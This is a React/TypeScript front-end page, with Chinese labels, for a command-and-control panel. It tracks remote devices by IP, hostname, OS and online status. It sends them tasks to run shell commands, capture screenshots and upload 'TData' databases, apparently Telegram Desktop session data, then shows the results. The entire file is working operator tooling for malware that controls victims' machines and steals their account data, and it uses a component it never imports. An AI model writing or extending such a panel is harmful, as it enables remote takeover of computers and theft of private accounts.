import { listC2DeviceVoByPageUsingPost, deleteC2DeviceUsingPost } from '@/services/backend/c2DeviceController';
import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
import type { ActionType, ProColumns } from '@ant-design/pro-components';
import { PageContainer, ProTable, ModalForm, ProFormText, ProFormTextArea } from '@ant-design/pro-components';
import '@umijs/max';
import { Button, message, Tag, Space, Typography, Image } from 'antd';
import React, { useRef, useState } from 'react';

const C2DevicePage: React.FC = () => {
  const actionRef = useRef<ActionType>();
  const [createModalVisible, setCreateModalVisible] = useState<boolean>(false);
  const [currentDeviceId, setCurrentDeviceId] = useState<string>('');
  
  const handleDelete = async (row: API.C2DeviceVO) => {
    const hide = message.loading('正在删除');
    if (!row) return true;
    try {
      await deleteC2DeviceUsingPost({
        id: row.id as any,
      });
      hide();
      message.success('删除成功');
      actionRef?.current?.reload();
      return true;
    } catch (error: any) {
      hide();
      message.error('删除失败，' + error.message);
      return false;
    }
  };

  const handleAddTask = async (fields: API.C2TaskAddRequest) => {
    const hide = message.loading('正在下发任务');
    try {
      await addC2TaskUsingPost({ ...fields });
      hide();
      message.success('任务下发成功');
      return true;
    } catch (error: any) {
      hide();
      message.error('任务下发失败，' + error.message);
      return false;
    }
  };

  /**
   * 渲染任务子表格
   */
  const expandedRowRender = (record: API.C2DeviceVO) => {
    const taskColumns: ProColumns<API.C2TaskVO>[] = [
      { title: '命令', dataIndex: 'command', width: 100 },
      { title: '参数', dataIndex: 'params', width: 150, ellipsis: true },
      { 
        title: '状态', 
        dataIndex: 'status', 
        width: 100,
        valueEnum: {
          pending: { text: '等待中', status: 'Default' },
          completed: { text: '已完成', status: 'Success' },
          failed: { text: '失败', status: 'Error' },
        },
      },
      {
        title: '执行结果 / 截图',
        dataIndex: 'result',
        render: (_, task) => {
          if (!task.result) return '-';
          if (task.command === 'screenshot' && task.status === 'completed') {
            return <Image src={`data:image/png;base64,${task.result}`} width={200} />;
          }
          return (
            <Typography.Paragraph
              ellipsis={{ rows: 2, expandable: true, symbol: '展开' }}
              copyable
            >
              {task.result}
            </Typography.Paragraph>
          );
        },
      },
      { title: '创建时间', dataIndex: 'createTime', valueType: 'dateTime', width: 180 },
    ];

    return (
      <ProTable<API.C2TaskVO>
        columns={taskColumns}
        headerTitle={false}
        search={false}
        options={false}
        rowKey="id"
        request={async (params) => {
          const { data, code } = await listC2TaskVoByPageUsingPost({
            ...params,
            deviceId: record.id,
            pageSize: 100,
            sortField: 'createTime',
            sortOrder: 'descend',
          } as API.C2TaskQueryRequest);
          return {
            success: code === 0,
            data: data?.records || [],
            total: data?.total || 0,
          };
        }}
        pagination={false}
      />
    );
  };

  const columns: ProColumns<API.C2DeviceVO>[] = [
    {
      title: '设备ID',
      dataIndex: 'id',
      valueType: 'text',
      hideInForm: true,
    },
    {
      title: '内网IP',
      dataIndex: 'internalIp',
      valueType: 'text',
    },
    {
      title: '外网IP',
      dataIndex: 'externalIp',
      valueType: 'text',
    },
    {
      title: '主机名',
      dataIndex: 'hostName',
      valueType: 'text',
    },
    {
      title: '操作系统',
      dataIndex: 'os',
      valueType: 'text',
    },
    {
      title: '在线状态',
      dataIndex: 'status',
      hideInSearch: true,
      render: (_, record) => {
        if (!record.lastSeen) return <Tag color="red">离线</Tag>;
        const lastSeen = new Date(record.lastSeen).getTime();
        const now = new Date().getTime();
        const isOnline = (now - lastSeen) < 2 * 60 * 1000;
        return isOnline ? <Tag color="green">在线</Tag> : <Tag color="red">离线</Tag>;
      },
    },
    {
      title: '最后活跃',
      dataIndex: 'lastSeen',
      valueType: 'dateTime',
      hideInSearch: true,
    },
    {
      title: '操作',
      dataIndex: 'option',
      valueType: 'option',
      render: (_, record) => [
        <a
          key="task"
          onClick={() => {
            setCurrentDeviceId(String(record.id));
            setCreateModalVisible(true);
          }}
        >
          下发任务
        </a>,
        <a
          key="delete"
          style={{ color: 'red' }}
          onClick={() => {
            handleDelete(record);
          }}
        >
          删除
        </a>,
      ],
    },
  ];

  return (
    <PageContainer>
      <ProTable<API.C2DeviceVO>
        headerTitle={'C2 设备列表（展开可查看该设备的所有任务及结果）'}
        actionRef={actionRef}
        rowKey="id"
        search={{
          labelWidth: 120,
        }}
        expandable={{ expandedRowRender }}
        request={async (params, sort, filter) => {
          const sortField = Object.keys(sort)?.[0];
          const sortOrder = sort?.[sortField] ?? undefined;

          const { data, code } = await listC2DeviceVoByPageUsingPost({
            ...params,
            sortField,
            sortOrder,
            ...filter,
          } as API.C2DeviceQueryRequest);

          return {
            success: code === 0,
            data: data?.records || [],
            total: Number(data?.total) || 0,
          };
        }}
        columns={columns}
      />
      <ModalForm
        title={'下发任务'}
        width="400px"
        visible={createModalVisible}
        onVisibleChange={setCreateModalVisible}
        onFinish={async (value) => {
          const success = await handleAddTask({
            ...value,
            deviceId: Number(currentDeviceId)
          } as API.C2TaskAddRequest);
          if (success) {
            setCreateModalVisible(false);
            actionRef.current?.reload();
          }
        }}
      >
        <ProFormText
          label="设备ID"
          name="deviceIdDisplay"
          disabled
          initialValue={currentDeviceId}
        />
        <ProFormSelect
          label="命令"
          name="command"
          rules={[{ required: true, message: '请选择命令' }]}
          valueEnum={{
            cmd_exec: '执行CMD命令',
            screenshot: '屏幕截图',
            upload_db: '上传TData数据库',
          }}
          placeholder="请选择命令"
        />
        <ProFormTextArea
          label="参数"
          name="params"
          placeholder="命令参数 (如 whoami)"
        />
      </ModalForm>
    </PageContainer>
  );
};

export default C2DevicePage;
